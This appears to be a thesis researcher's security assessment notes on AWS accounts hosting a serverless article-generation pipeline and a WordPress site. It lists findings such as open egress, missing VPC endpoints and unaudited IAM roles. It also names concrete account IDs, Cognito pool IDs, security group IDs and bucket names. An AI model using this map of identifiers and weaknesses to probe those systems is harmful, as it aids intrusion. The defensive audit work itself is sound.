### 🚨 Security Findings Summary

| # | Finding | Severity | Attack Scenario |
|---|---|---|---|
| 1 | **Lambda functions run outside VPC** | MEDIUM | No network-level isolation; rely entirely on IAM |
| 2 | **No VPC endpoints** (S3, DynamoDB, Bedrock, SM) | MEDIUM | AWS API traffic over internet, susceptible to interception |
| 3 | **Batch SG allows HTTP 80 from 0.0.0.0/0** | MEDIUM | Why does transcription batch need inbound HTTP? |
| 4 | **All egress fully open** | HIGH | Compromised Lambda/Batch can exfiltrate to anywhere |
| 5 | **Secrets stored in SecretsManager** — exposed via env vars as ARN | LOW | ARN visible, but access still controlled by IAM |
| 6 | **Multiple developer sandbox resources** in same account | MEDIUM | Shared account — dev sandboxes may have broader permissions |
| 7 | **External API calls** (factcheck) from Lambda | MEDIUM | External dependency — data leaves AWS |
| 8 | **Lambda roles need audit** — unclear if least-privilege | HIGH | May have broader Bedrock/S3/DynamoDB access than needed |

---

### Key Differences: Article Generator vs WordPress

| Aspect | WordPress | Article Generator |
|---|---|---|
| **Architecture** | EC2 + RDS (traditional) | Lambda + Step Functions + Batch (serverless) |
| **Compute** | Single EC2 (t3.micro) | 16+ Lambda functions + GPU Batch |
| **Database** | RDS MySQL | DynamoDB (8 tables) |
| **Network** | VPC-heavy (SGs, NAT, endpoints) | Mostly VPC-less (Lambda outside VPC) |
| **Attack Surface** | SSRF → credential theft → DB access | Over-privileged IAM roles → data access |
| **Hardening Focus** | Network controls (SGs, endpoints, IMDSv2) | IAM least-privilege + resource policies |
| **Complexity** | Low (simple web app) | High (many services, pipelines, integrations) |

---

### Thesis Implications

**If you choose Article Generator as the case study:**
- Focus shifts to **IAM hardening** (not network segmentation)
- Attack scenarios: compromised Lambda → what DynamoDB tables, S3 buckets, Bedrock models can it access?
- More complex but more representative of modern cloud workloads
- Need to audit each Lambda role individually

**If you choose WordPress:**
- Focus on **network hardening** (SGs, VPC endpoints, egress)
- Simpler, clearer before/after story
- Faster to implement and measure
- Better for thesis timeline

**Fabian recommended Article Generator** because it's more modern and demonstrates fine-grained permissions. But WordPress gives a cleaner thesis narrative.


---

## Gathered Data: Article Generator Prod Account

**Account:** 381492097421 | **Region:** eu-central-1 | **Deployed via:** CDK (VideoToArticleStack + service stacks)  
**Date Gathered:** 8 June 2026

---

### Architecture Overview

```
┌──────────────────────────────────────────────────────────────┐
│  Article Generator - PRODUCTION                               │
│                                                              │
│  Video Source (S3: videotoarticlestack-video-src)             │
│      │                                                       │
│      ▼                                                       │
│  Step Functions (5 state machines)                            │
│      │  MainPipeline, MainPipelineRetryWrapper               │
│      │  DynPipeline, HblPipeline, GenerateArticlePipeline    │
│      │                                                       │
│      ├──► Lambda: prod-TranscriptionAudioConversion (10GB)   │
│      ├──► Lambda: prod-TranscriptionJobManagement            │
│      │        → AWS Batch (GPU transcription)                │
│      ├──► Lambda: prod-NERProcessor (Bedrock)                │
│      ├──► Lambda: prod-NERJobManagement                      │
│      ├──► Lambda: prodPromptGenerationLambda (Bedrock)       │
│      ├──► Lambda: FactCheckTriggerLambda                     │
│      ├──► Lambda: HblArticleResultsSfnLambda                 │
│      └──► Lambda: emailNotificationLambda (SES/SMTP)         │
│                                                              │
│  REST API (API Gateway)                                       │
│      ├── GetItem, DeleteItem, PostEmail, DeleteEmail          │
│      └── PublishingAuthorizer (Cognito JWT validation)        │
│                                                              │
│  Auth: Cognito User Pools                                     │
│      ├── Central: eu-central-1_wrxHF5vE8                     │
│      └── Tenant: eu-central-1_T77SP40MG                      │
│                                                              │
│  VPC (10.0.0.0/16) — Only for AWS Batch                      │
│      └── Transcription Batch jobs (GPU)                      │
│                                                              │
│  ⚠️ NO VPC Endpoints                                         │
│  ⚠️ NO running EC2 instances (all serverless)                │
└──────────────────────────────────────────────────────────────┘
```

---

### Compute

**Lambda Functions (17+):**
- All run **outside VPC** (no VPC config)
- No running EC2 instances (Batch only spins up on demand)
- Domain: article-generation-prod.dyn.sport

**Key Differences from Dev:**
- Cleaner — no developer sandbox stacks (sep-, sep3-, seb-, nik-)
- Dedicated account — no shared resources
- Has Cognito auth (PublishingAuthorizer)
- Has email notification (SES SMTP)

---

### Lambda Functions (Core Business Logic)

| Lambda | Role | Key Services | Memory |
|---|---|---|---|
| prodPromptGenerationLambda | PromptGenerationLambdaSer-... | Bedrock, S3, DynamoDB | 128MB |
| prod-NERProcessor | NERProcessorServiceRole-... | Bedrock, DynamoDB, SecretsManager | 1024MB |
| prod-NERJobManagement | NERJobManagementServiceRole-... | Lambda (invoke), DynamoDB | 512MB |
| prod-TranscriptionAudioConversion | TranscriptionAudioConvers-... | S3 | 10240MB |
| prod-TranscriptionJobManagement | TranscriptionJobManagemen-... | Batch, S3, DynamoDB | 128MB |
| HblArticleResultsSfnLambda | HblArticleResultsSfnLambda-... | Bedrock, S3, DynamoDB, SecretsManager | 128MB |
| emailNotificationLambda | EmailNotificationServiceRole2 | SES, SecretsManager, DynamoDB | 128MB |
| PublishingAuthorizerLambda | PublishingAuthorizerLambda-... | Cognito, SecretsManager | 128MB |
| RestApiStack-* (4 functions) | Various | DynamoDB | 128MB |

---

### Security Groups

**Transcription Batch SG (sg-085fcfba37471f42e):**

| Direction | Protocol | Port | Source/Destination | Issue? |
|---|---|---|---|---|
| Inbound | TCP | 80 | 0.0.0.0/0 | ⚠️ HTTP from anywhere — unnecessary for batch |
| Outbound | ALL | ALL | 0.0.0.0/0 | 🚨 Fully open egress |

**Default VPC SG (sg-08d0f3f265e882cac):**

| Direction | Protocol | Port | Source/Destination | Issue? |
|---|---|---|---|---|
| Inbound | ALL | ALL | Self (same SG) | ✅ OK |
| Outbound | ALL | ALL | 0.0.0.0/0 | 🚨 Fully open egress |

---

### VPC Endpoints

**⚠️ NONE — No VPC endpoints in production!**

Same as dev — Batch instances access S3 over internet via NAT.

---

### Storage — DynamoDB Tables (3 — much cleaner than dev)

| Table | Purpose |
|---|---|
| TextResults | Article text results (main data store) |
| processing-jobs | Job tracking (transcription, NER) |
| publication-jobs | Publication workflow tracking |

---

### Storage — S3 Buckets (6 — clean, no sandbox clutter)

| Bucket | Purpose |
|---|---|
| videotoarticlestack-video-src-381492097421 | Video source input |
| videotoarticlestack-destination-381492097421 | Generated article output |
| hbl-article-results-381492097421 | HBL article results |
| frontendstack-dynvideotoseotextbucket-... | Frontend SEO text |
| cdk-hnb659fds-assets-...-eu-central-1 | CDK assets |
| cdk-hnb659fds-assets-...-us-east-1 | CDK assets (cross-region for CloudFront) |

---

### Step Functions (5 — no dev sandbox variants)

| State Machine | Purpose |
|---|---|
| MainPipeline | Main orchestration |
| MainPipelineRetryWrapper | Retry wrapper (resilience) |
| DynPipeline | DYN-specific workflow |
| HblPipeline | HBL-specific workflow |
| GenerateArticlePipeline | Core article generation |

---

### External Integrations & Secrets

| Integration | Access Method | Secret ARN |
|---|---|---|
| Amazon Bedrock (Claude) | Lambda → API (public internet) | N/A (IAM auth) |
| SecretsManager | Lambda → API (public internet) | VideoToArticleStack/secrets-1N101A |
| SES SMTP | Lambda → SMTP | SesSmtpStack/secrets |
| Cognito (Auth) | Lambda → Cognito API | CognitoClient |
| NER Webhook | External inbound | prodner-webhook-secret-... |
| External Factcheck API | Lambda → HTTPS | Via secrets |

---

### Authentication

| Component | Detail |
|---|---|
| Central User Pool | eu-central-1_wrxHF5vE8 |
| Tenant User Pool | eu-central-1_T77SP40MG |
| Issuer | https://cognito-idp.eu-central-1.amazonaws.com/eu-central-1_wrxHF5vE8 |
| Publishing API | JWT-validated via PublishingAuthorizerLambda |

---

### SNS Topics

| Topic | Purpose |
|---|---|
| ArticleGeneratorAlerts | Pipeline alerts |
| CISAlarm | CIS benchmark alarms |
| aws-controltower-SecurityNotifications | Control Tower |
| prod-TranscriptionServiceAlarms | Transcription alerts |

---

### 🚨 Security Findings Summary (Prod)

| # | Finding | Severity | Impact |
|---|---|---|---|
| 1 | **All Lambda functions outside VPC** | MEDIUM | No network isolation — rely entirely on IAM |
| 2 | **No VPC endpoints** | MEDIUM | All AWS API calls over public internet |
| 3 | **Batch SG allows HTTP 80 from 0.0.0.0/0** | MEDIUM | Unnecessary inbound on GPU instances |
| 4 | **All egress fully open** | HIGH | Compromised Batch/Lambda can exfiltrate |
| 5 | **Lambda roles need audit** | HIGH | Unclear if least-privilege (Bedrock, S3, DynamoDB access scope?) |
| 6 | **Multiple secrets in SecretsManager** | LOW | Managed, but need rotation policy check |
| 7 | **Webhook secret exposed as env var ARN** | LOW | ARN visible but access controlled by IAM |
| 8 | **No resource-based policies on DynamoDB** | MEDIUM | Any role with dynamodb:* on table ARN can access |

---

### Dev vs Prod Comparison (Article Generator)

| Aspect | Dev (905418363445) | Prod (381492097421) |
|---|---|---|
| Lambda Functions | 16+ (includes sandbox variants) | 17 (clean, production only) |
| DynamoDB Tables | 8 (includes seb-, sep3- sandboxes) | 3 (clean) |
| S3 Buckets | 13 (includes sandbox variants) | 6 (clean) |
| Step Functions | 11 (includes sep-, sep3- variants) | 5 (clean) |
| EC2 Instances | Terminated batch instances | None (fully serverless) |
| VPC Endpoints | None | None |
| Batch SG (HTTP 80) | ⚠️ Open | ⚠️ Open |
| Auth (Cognito) | Not visible | ✅ Cognito User Pools |
| Email (SES) | Not visible | ✅ SES SMTP integration |
| Developer Sandboxes | Yes (seb, nik, sep, sep3) | No (clean) |

---

### All 4 Accounts Summary

| Account | Type | Architecture | Key Risk | Hardening Focus |
|---|---|---|---|---|
| 851725424182 | WordPress Dev | EC2 + RDS | SSRF (IMDSv1) + open DB SG | Network controls |
| 851725489819 | WordPress Prod | EC2 + RDS | Same + no VPC endpoints | Network controls |
| 905418363445 | Article Gen Dev | Lambda + Batch + DynamoDB | Over-permissive IAM + open egress | IAM least-privilege |
| 381492097421 | Article Gen Prod | Lambda + Batch + DynamoDB | Same + production data at risk | IAM least-privilege |
